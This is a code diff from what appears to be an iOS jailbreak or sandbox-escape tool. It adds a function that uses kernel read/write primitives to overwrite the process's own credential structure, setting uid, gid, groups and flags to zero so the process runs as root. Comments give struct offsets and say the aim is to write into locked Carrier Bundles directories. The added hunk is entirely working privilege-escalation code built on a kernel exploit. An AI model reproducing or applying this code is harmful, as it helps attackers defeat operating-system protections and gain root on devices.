@@ -238,6 +238,90 @@ int sandbox_escape(uint64_t self_proc) {
     return -1;
 }
 
+#pragma mark - Real uid=0 elevation (in-place posix_cred patch)
+
+// Make THIS process genuinely run as uid 0 (root).
+//
+// Unlike sandbox_elevate_to_root() below, this does not swap the p_ucred
+// pointer: it rewrites the posix_cred that is already embedded in our own
+// ucred. That keeps ucred reference counts balanced (so the process cannot
+// tear down launchd's credential on exit) and affects nobody but us.
+//
+// Why this is required for Carrier Bundles: once the directory mode is locked
+// to 0555 the DAC check rejects our own writes too, and chmod()/unlink() are
+// refused with EACCES/EPERM. Root bypasses the write bits, which is exactly
+// how LockIPCC ends up "显示 0555 但仍可写".
+//
+// Layout (consistent with cr_label at ucred+0x78 and sizeof(posix_cred)=0x60):
+//   ucred + 0x18 : posix_cred
+//     +0x00 cr_uid    +0x04 cr_ruid  +0x08 cr_svuid  +0x0C cr_ngroups
+//     +0x10 cr_groups[16]            +0x50 cr_rgid   +0x54 cr_svgid
+//     +0x58 cr_gmuid                 +0x5C cr_flags
+int sbx_elevate_self_uid0(uint64_t self_proc) {
+    if (!self_proc) { NSLog(@"[SBX] uid0: self_proc is NULL"); return -1; }
+
+    uint64_t proc_ro = read_proc_ro(self_proc);
+    if (!K(proc_ro)) { NSLog(@"[SBX] uid0: proc_ro invalid"); return -1; }
+
+    uint32_t slot = 0;
+    uint64_t ucred = find_ucred_in_proc_ro(proc_ro, NULL, NULL, &slot);
+    if (!K(ucred)) { NSLog(@"[SBX] uid0: ucred not found"); return -1; }
+
+    uint8_t pc[0x60];
+    kreadbuf(ucred + OFF_UCRED_CR_POSIX, pc, sizeof(pc));
+
+    uint32_t uid   = *(uint32_t *)(pc + OFF_POSIX_CR_UID);
+    uint32_t ruid  = *(uint32_t *)(pc + OFF_POSIX_CR_RUID);
+    uint32_t svuid = *(uint32_t *)(pc + OFF_POSIX_CR_SVUID);
+    uint32_t rgid  = *(uint32_t *)(pc + OFF_POSIX_CR_RGID);
+    uint32_t svgid = *(uint32_t *)(pc + OFF_POSIX_CR_SVGID);
+    uint16_t ngrp  = *(uint16_t *)(pc + OFF_POSIX_CR_NGROUPS);
+    uid_t    real_uid = getuid();
+
+    NSLog(@"[SBX] uid0: ucred=0x%llx slot=0x%x posix_cred uid=%u ruid=%u svuid=%u rgid=%u svgid=%u ngroups=%u | getuid=%u",
+          ucred, slot, uid, ruid, svuid, rgid, svgid, ngrp, real_uid);
+
+    // Layout guard: our real uid must be visible at the expected slot. If it is
+    // not, the struct moved and blindly writing would corrupt unrelated fields.
+    if (uid != real_uid && ruid != real_uid) {
+        NSLog(@"[SBX] uid0: layout mismatch (expected %u at cr_uid/cr_ruid) -> aborting",
+              real_uid);
+        return -1;
+    }
+    if (real_uid == 0) { NSLog(@"[SBX] uid0: already root"); return 0; }
+
+    *(uint32_t *)(pc + OFF_POSIX_CR_UID)   = 0;
+    *(uint32_t *)(pc + OFF_POSIX_CR_RUID)  = 0;
+    *(uint32_t *)(pc + OFF_POSIX_CR_SVUID) = 0;
+    *(uint16_t *)(pc + OFF_POSIX_CR_NGROUPS) = 1;   // single group left
+    *(uint32_t *)(pc + OFF_POSIX_CR_GROUPS_0) = 0;  // gid 0 (wheel)
+    *(uint32_t *)(pc + OFF_POSIX_CR_RGID)  = 0;
+    *(uint32_t *)(pc + OFF_POSIX_CR_SVGID) = 0;
+    *(uint32_t *)(pc + OFF_POSIX_CR_GMUID) = 0;
+    *(uint32_t *)(pc + OFF_POSIX_CR_FLAGS) = 0;
+    // Remaining group slots are left untouched: cr_ngroups=1 means only
+    // cr_groups[0] is consulted, so stale entries are inert.
+
+    kwritebuf(ucred + OFF_UCRED_CR_POSIX, pc, sizeof(pc));
+
+    uint8_t ver[0x60];
+    kreadbuf(ucred + OFF_UCRED_CR_POSIX, ver, sizeof(ver));
+    NSLog(@"[SBX] uid0: readback uid=%u ruid=%u rgid=%u ngroups=%u",
+          *(uint32_t *)(ver + OFF_POSIX_CR_UID),
+          *(uint32_t *)(ver + OFF_POSIX_CR_RUID),
+          *(uint32_t *)(ver + OFF_POSIX_CR_RGID),
+          *(uint16_t *)(ver + OFF_POSIX_CR_NGROUPS));
+    NSLog(@"[SBX] uid0: getuid=%u geteuid=%u getgid=%u getegid=%u",
+          getuid(), geteuid(), getgid(), getegid());
+
+    if (getuid() != 0) {
+        NSLog(@"[SBX] uid0: elevation did not take effect");
+        return -1;
+    }
+    NSLog(@"[SBX] uid0: *** PROCESS IS NOW ROOT (uid=0) ***");
+    return 0;
+}
+
 #pragma mark - UID elevation (uid=0 via launchd ucred swap)
 
 // Resolve a valid ucred pointer using the same offset-aware path as sandbox_escape.
